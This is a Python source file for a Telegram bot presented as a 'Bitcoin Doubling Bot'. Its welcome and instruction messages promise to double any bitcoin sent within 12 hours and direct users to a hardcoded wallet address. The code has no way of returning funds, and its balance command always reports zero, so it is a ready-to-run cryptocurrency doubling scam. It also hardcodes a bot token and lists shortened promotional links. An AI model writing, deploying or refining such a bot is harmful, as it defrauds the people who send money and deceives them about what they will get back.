import time
import telebot
import sqlite3
from emoji import emojize
from datetime import date
DB_NAME ='db.db'
day,month = date.today().day, date.today().month
try:
    with sqlite3.connect(DB_NAME) as conn:
 
        cur = conn.cursor()
        cur.execute("""
        CREATE TABLE IF NOT EXISTS users(
            userid UNIQUE,
            username TEXT,
            btc TEXT,
            btcwallet TEXT
                     );""")

except:
    print("[ERROR] Database Error")
btcwalletaddr = "1626ayuj8jQR1TtRMfuMytLHBjbTvbJjRW"
#BTC WALLET 1626ayuj8jQR1TtRMfuMytLHBjbTvbJjRW
#Shorten Link https://gsurl.be/hGtH
#Shorten Link https://gsurl.be/hGtO
#             https://gsurl.be/hGtQ
#             https://gsurl.be/hGtT
TOKEN = "989529767:AAH5x87SCWiMLg7vZrWiiqclvZcmf7cvsqw"
bot = telebot.TeleBot(token=TOKEN)
"""
def findat(msg):
    # from a list of texts, it finds the one with the '@' sign
    for i in msg:
        if '@' in i:
            return i
"""
@bot.message_handler(commands=['start']) # welcome message handler
def send_welcome(message):
    bot.reply_to(message, emojize('''Welcome to Bitcoin Doubling Bot\nWe Aren\'t like other bots we will
Double your BITCOIN for real and send them back to your wallet in 12 Hours 
for example:
    0.0005 btc -> 0.001 btc
    0.001  btc -> 0.002 btc 
    0.05   btc -> 0.1   btc
    :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: 
to Start Doubling,
Please Set your Bitcoin Wallet 
    /setwallet
and then 
    /doublebitcoin for instructions 
    /mybtc to check your BTC

    /help for getting help in commands 
    :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: '''))
@bot.message_handler(commands=['setwallet']) # help message handler
def set_wallet(message):
    bot.reply_to(message, 'Enter Your Wallet Address:\n')
@bot.message_handler(commands=['doublebitcoin']) # help message handler
def doublebtc(message):
    bot.reply_to(message, emojize('''to Double your Bitcoin
please send more than 0.0005 BTC
if the bitcoin sent is less than 0.0005 it will be ignored

send the bitcoin to this wallet Address:
:wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash:

1626ayuj8jQR1TtRMfuMytLHBjbTvbJjRW 

:wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash: :wavy_dash:

'''))
    


@bot.message_handler(commands=['mybtc']) # help message handler
def check_btc(message):
    bot.reply_to(message, 'Your Current BTC is\n0.000000 BTC')

@bot.message_handler(commands=['help']) # help message handler
def help(message):
    bot.reply_to(message, '/start to start the bot again\n/mybtc to check your BTC\n/setwallet to set your bitcoin wallet\n/doublebitcoin for doubling instructions\n\n\n/help for getting this menu')
"""
@bot.message_handler(func=lambda msg: msg.text is not None and '@' in msg.text)
# lambda function finds messages with the '@' sign in them
# in case msg.text doesn't exist, the handler doesn't process it
def at_converter(message):
    texts = message.text.split()
    at_text = findat(texts)
    if at_text == '@': # in case it's just the '@', skip
        pass
    else:
        insta_link = "https://instagram.com/{}".format(at_text[1:])
        bot.reply_to(message, insta_link)
"""
while True:
    try:
        bot.polling(none_stop=True)
        # ConnectionError and ReadTimeout because of possible timout of the requests library
        # maybe there are others, therefore Exception
    except Exception:
        time.sleep(15)